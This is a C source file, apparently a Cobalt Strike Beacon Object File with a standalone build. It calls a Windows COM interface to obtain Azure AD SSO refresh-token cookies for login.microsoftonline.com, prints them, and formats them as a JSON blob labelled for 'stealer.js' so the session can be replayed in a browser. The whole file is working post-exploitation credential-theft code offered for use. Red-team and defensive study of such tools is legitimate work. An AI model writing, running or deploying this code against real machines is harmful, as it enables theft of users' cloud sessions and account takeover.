#include <windows.h>
#include "base.c"
#include <stdio.h>


int requestaadprt(LPCWSTR nonce) {
	LPCWSTR uri = L"https://login.microsoftonline.com/";
	wchar_t * full_uri = NULL;
	// We have a nonce, let's build the URL for it
	if (nonce != NULL) {
		const wchar_t * base_url = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";
		
		full_uri = (wchar_t*)MSVCRT$calloc(MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce) + 2, sizeof(wchar_t));
		if(full_uri == NULL){
			internal_printf("Failed to initialize memory.\n");
			return 1;
		}
		KERNEL32$lstrcpynW(full_uri, base_url, MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce));
		KERNEL32$lstrcatW(full_uri, nonce);
		uri = full_uri;
	}

	internal_printf("Using uri: %ls\n", uri);
	DWORD cookieCount = 0;
	ProofOfPossessionCookieInfo* cookies;
	IProofOfPossessionCookieInfoManager* popCookieManager;
	GUID CLSID_ProofOfPossessionCookieInfoManager;
	GUID IID_IProofOfPossessionCookieInfoManager;

	OLE32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
	OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);

	HRESULT hr = OLE32$CoInitializeEx(NULL, 0x0);
	if (hr == RPC_E_CHANGED_MODE){
		hr = OLE32$CoInitializeEx(NULL, 0x2);	
	}
	if (FAILED(hr))	{
		internal_printf("CoInitialize error: 0x%04x\n", hr);
		return 0;
	}

	hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
	if (FAILED(hr))	{
		internal_printf("CoCreateInstance error: 0x%4x\n", hr);;
		return 0;
	}

	hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
	if (FAILED(hr))	{
		internal_printf("GetCookieInfoForUri error: 0x%4x\n", hr);
		return 0;
	}

	if (cookieCount == 0) {
		internal_printf("No cookies for the URI\n");
		return 0;
	}

	// stealer.js JSON string prep
	wchar_t* stealerPrefix = L"{\"url\":\"https://login.microsoftonline.com\",\"cookies\":[";
	wchar_t* stealerSuffix = L"],\"local_storage\":[]}";
	
	size_t jsonSize = 0;
	size_t capacity = 2048;
	
	wchar_t* jsonOutput = (wchar_t*)MSVCRT$malloc(capacity * sizeof(wchar_t));
	if(jsonOutput == NULL){
		internal_printf("Failed to initialize memory\n");
		return 1;
	}

	MSVCRT$wcscpy(jsonOutput, stealerPrefix);
	jsonSize = MSVCRT$wcslen(jsonOutput);

	for (DWORD i = 0; i < cookieCount; i++) {
		internal_printf("Name %ls\n", cookies[i].name);
		internal_printf("Name: %ls\n", cookies[i].name);
		internal_printf("Data: %ls\n", cookies[i].data);
		internal_printf("Flags: %x\n", cookies[i].flags);
		internal_printf("P3PHeader: %ls\n\n", cookies[i].p3pHeader);
		
		// copy every char up until the first semi-colon char
		wchar_t* semicolonPos = MSVCRT$wcschr(cookies[i].data, L';');
		if (semicolonPos != NULL) {
			*semicolonPos = L'\0';
		}
		size_t nameLen = MSVCRT$wcslen(cookies[i].name);
		size_t dataLen = MSVCRT$wcslen(cookies[i].data);
		size_t neededSize = nameLen + dataLen + 256;
		
		wchar_t* cookieJson = (wchar_t*)MSVCRT$malloc(neededSize * sizeof(wchar_t));
		
		int written = MSVCRT$_snwprintf(
			cookieJson,
			neededSize,
			L"{\"name\":\"%ls\",\"value\":\"%ls\",\"domain\":\"login.microsoftonline.com\",\"path\":\"/\",\"secure\":true,\"httpOnly\":true},",
			cookies[i].name,
			cookies[i].data
		);
		size_t chunkLen = MSVCRT$wcslen(cookieJson);

		// check if we need to resize the JSON buffer
		if (jsonSize + chunkLen + MSVCRT$wcslen(stealerSuffix) + 1 > capacity) {
			capacity += 2048;
			wchar_t* newOutput = (wchar_t*)MSVCRT$realloc(jsonOutput, capacity * sizeof(wchar_t));
			if(newOutput == NULL){
				internal_printf("Failed to initialize memory\n");
				return 1;
			}
			jsonOutput = newOutput;
		}
		MSVCRT$wcscat(jsonOutput, cookieJson);
		jsonSize += chunkLen;
		MSVCRT$free(cookieJson);

		OLE32$CoTaskMemFree(cookies[i].name);
		OLE32$CoTaskMemFree(cookies[i].data);
		OLE32$CoTaskMemFree(cookies[i].p3pHeader);
	}

	// remove trailing comma from JSON string, append suffix
	if (jsonSize > 0 && jsonOutput[jsonSize - 1] == L',') {
		jsonOutput[jsonSize - 1] = L'\0';
		jsonSize--;
	}
	MSVCRT$wcscat(jsonOutput, stealerSuffix);

	internal_printf("\nJSON cookie blob for use with stealer.js:\n");
	printoutput(FALSE); // empty the buffer since the JSON string can get beefy
	internal_printf("%ls\n\n", jsonOutput);
	
	MSVCRT$free(jsonOutput);
	OLE32$CoTaskMemFree(cookies);
	MSVCRT$free(full_uri);

	internal_printf("DONE\n");

	return 0;
}

#ifdef BOF
VOID go( 
	IN PCHAR Args, 
	IN ULONG Length 
) {
	datap parser;
	const wchar_t * nonce = NULL;

	BeaconDataParse(&parser, Args, Length);
	nonce = (const wchar_t*)  BeaconDataExtract(&parser, NULL);
	
	if(!bofstart()) {
		return;
	}

	requestaadprt(nonce);
	printoutput(TRUE);
	bofstop();
};
#else
int main(int argc, char *argv[]) {
	// Convert char * argument to wchar_t argument.
	wchar_t * nonce;
	if (argc == 2) {
		size_t length = MSVCRT$strlen(argv[1]) + 1;
		nonce = (wchar_t*)MSVCRT$calloc(length, sizeof(wchar_t));

		if(nonce == NULL) {
			internal_printf("Failed to initialize memory.\n");
			return 1;
		}

		MSVCRT$mbstowcs_s(NULL, nonce, length, argv[1], length - 1);

	} else {
		nonce = NULL;
	}

	requestaadprt(nonce);
	return 1;
	// code for standalone exe for scanbuild / leak checks
}
#endif
